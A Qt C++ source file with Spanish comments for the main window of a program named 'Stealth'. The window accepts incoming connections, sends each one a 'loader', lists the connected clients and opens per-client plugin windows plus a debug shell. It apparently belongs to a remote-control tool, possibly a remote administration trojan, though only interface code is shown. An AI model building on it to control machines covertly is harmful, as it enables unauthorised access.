#include "stealth.h"
#include "ui_stealth.h"

#include "crypto.h"

Stealth::Stealth(QWidget *parent) : QMainWindow(parent),
                                    ui(new Ui::Stealth)
{
    ui->setupUi(this);
    this->bdebugShell=false;

#ifdef Q_WS_WIN
    /* En windows omprobamos que las dlls que necesitamos están en su sitio */
    QDir dir=QDir::currentPath();
    QFile file;
    if(!file.exists(dir.filePath("ssleay32.dll"))) qFatal("No se encontró \"ssleay32.dll\"");
    else qDebug()<<"Cargada ssleay32.dll";

    if(!file.exists(dir.filePath("qca2.dll"))) qFatal("No se encontró \"qca2.dll\"");
    else qDebug()<<"Cargada qca2.dll";

    if(!file.exists(dir.filePath("libeay32.dll"))) qFatal("No se encontró \"libeay32.dll\"");
    else qDebug()<<"Cargada libeay32.dll";

    if(!dir.cd("crypto")) qFatal("No se encontró \"/crypto\"");
    else
    {
        if(!file.exists(dir.filePath("qca-ossl2.dll"))) qFatal("No se encontró \"/crypto/qca-ossl2.dll\"");
        else qDebug()<<"Cargada /crypto/qca-ossl2.dll";
    }
#endif


    /* Necesario para usar QCA */
    QCA::Initializer init;

    /* Creamos los controles de las 4 pestañas de la ventana
        y las añadimos al StackedWidget */
    stab1=new StealthTab1();
    stab2=new StealthTab2();
    stab3=new StealthTab3();
    stab4=new StealthTab4();
    slidingStackedWidget=new SlidingStackedWidget(this);
    slidingStackedWidget->addWidget(stab1);
    slidingStackedWidget->addWidget(stab2);
    slidingStackedWidget->addWidget(stab3);
    slidingStackedWidget->addWidget(stab4);
    slidingStackedWidget->setSpeed(250);

    ui->centralFrameLayout->addWidget(slidingStackedWidget);

    /* Inicializamos las clases que se encargan de la conexión */
    server=new Server();
    qDebug()<<"Creada clase Server";
    messageManager=new MessageManager();
    qDebug()<<"Creada clase MessageManager";
    connectionManager=new ConnectionManager(this,messageManager);
    qDebug()<<"Creada clase ConnectionManager";

    /* Evendo de doble click en un item del treewidget */
    connect(stab1->treewidget->treewidget,SIGNAL(itemDoubleClicked(QTreeWidgetItem*,int)),this,SLOT(itemDoubleClicked(QTreeWidgetItem*,int)));

    /* Eventos de nueva conexión y conexión lista y conexión eliminada */
    connect(server,SIGNAL(newConnection(Connection*)),connectionManager,SLOT(sendLoader(Connection*)));
    connect(connectionManager,SIGNAL(connectionReady(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(connectionManager,SIGNAL(connectionDeleted(int)),this,SLOT(deleteConnection(int)));

    /* Evento de mensaje de plugin recibido */
    //FIXME: Mover esto a otra parte más adecuada
    connect(messageManager,SIGNAL(receivedPluginMessage(Connection*,int,QByteArray)),this,SLOT(processPluginMessage(Connection*,int,QByteArray)));

    /* Ponemos un tamaño adecuado en función de la resolución, y centramos la ventana */
    setGeometry(
            (int)(QApplication::desktop()->width() -
                (QApplication::desktop()->width() -
                (QApplication::desktop()->width() / 2)) * 1.5) / 2,
            (int)(QApplication::desktop()->height() -
                (QApplication::desktop()->height() -
                (QApplication::desktop()->height() / 2)) * 1.5) / 2,
            (int)((QApplication::desktop()->width() -
                (QApplication::desktop()->width() / 2)) * 1.5),
            (int)((QApplication::desktop()->height() -
                (QApplication::desktop()->height() / 2)) * 1.5));
}

Stealth::~Stealth()
{
    delete ui;
}

void Stealth::showEvent(QShowEvent *)
{
    //TODO: Splash
}

void Stealth::itemDoubleClicked(QTreeWidgetItem *item,int)
{
    /* Recuperamos el id que guardamos en el item que se clicó
        usando el campo Qt::UserRole */
    QVariant id=item->data(0,Qt::UserRole);

    qDebug()<<"Clicado item #"+QString::number(id.toInt());

    /* Buscamos la ventana de plugins asociada el item que se clicó y la mostramos*/
    foreach(PluginWindow* pw,pluginWindows)
    {
        if(pw->getID()==id.toInt())
        {
            pw->show();
            return;
        }
    }
}

void Stealth::addConnection(Connection *connection)
{
    /* Añadimso el item al treewidget y creamo suna ventana
        de plugins nueva asociada con el item */
    stab1->treewidget->addItem(connection);
    PluginWindow* pluginWindow=new PluginWindow(connection,this);
    this->pluginWindows.append(pluginWindow);
}

void Stealth::deleteConnection(int ID)
{
    /* Recorremos todos los items del treewidget */
    for(int i=0;i<stab1->treewidget->treewidget->topLevelItemCount();i++)
    {
        QTreeWidgetItem* item=stab1->treewidget->treewidget->topLevelItem(i);

        /* Si el ID coincide con el del item, lo eliminamos */
        if(ID==item->data(0,Qt::UserRole).toInt())
        {
            delete item;

            /* Buscamos la vantana de plugins asociada al item y la eliminamos */
            foreach(PluginWindow* pw,pluginWindows)
            {
                if(pw->getID()==ID)
                {
                    /* FIXME: Hay que destruírla, pero sin cargarse el index */
                    pw->hide();
                    return;
                }
            }
            return;
        }
    }
}

/* FIXME: Hay que reestructurar para mover esto de aquí, esta clase no tendría
          que preocuparse de estas cosas */
void Stealth::processPluginMessage(Connection* connection,int PluginID,QByteArray data)
{
    /* Buscamos el plugin por su ID y le mandamos el mensaje */
    foreach(PluginWindow* pw,pluginWindows)
    {
        if(pw->getID()==connection->getID())
        {
            pw->pluginManager->on_plugin_recvData(PluginID,data);
            return;
        }
    }

}

void Stealth::on_btnDebug_clicked()
{
    /* Si la shell no está visible, la creamos y la mostramos */
    if(!this->bdebugShell)
    {
        DebugShell* debugShell=new DebugShell(this);
        connect(debugShell,SIGNAL(destroyed()),this,SLOT(debugSheell_destroyed()));
        debugShell->show();
        bdebugShell=true;
    }
}

void Stealth::debugSheell_destroyed()
{
    this->bdebugShell=false;
}

void Stealth::on_btnConnections_toggled(bool checked)
{
    if(checked)
    {
        slidingStackedWidget->slideInIdx(0);
        ui->btnConnections->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);
    }
    else
    {
        ui->btnConnections->setToolButtonStyle(Qt::ToolButtonIconOnly);
    }
}

void Stealth::on_btnConfiguration_toggled(bool checked)
{
    if(checked)
    {
        slidingStackedWidget->slideInIdx(0);
        ui->btnConfiguration->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);
    }
    else
    {
        ui->btnConfiguration->setToolButtonStyle(Qt::ToolButtonIconOnly);
    }
}

void Stealth::on_btnPlugins_toggled(bool checked)
{
    if(checked)
    {
        slidingStackedWidget->slideInIdx(0);
        ui->btnPlugins->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);
    }
    else
    {
        ui->btnPlugins->setToolButtonStyle(Qt::ToolButtonIconOnly);
    }
}

void Stealth::on_btnServer_toggled(bool checked)
{
    if(checked)
    {
        slidingStackedWidget->slideInIdx(0);
        ui->btnServer->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);
    }
    else
    {
        ui->btnServer->setToolButtonStyle(Qt::ToolButtonIconOnly);
    }
}
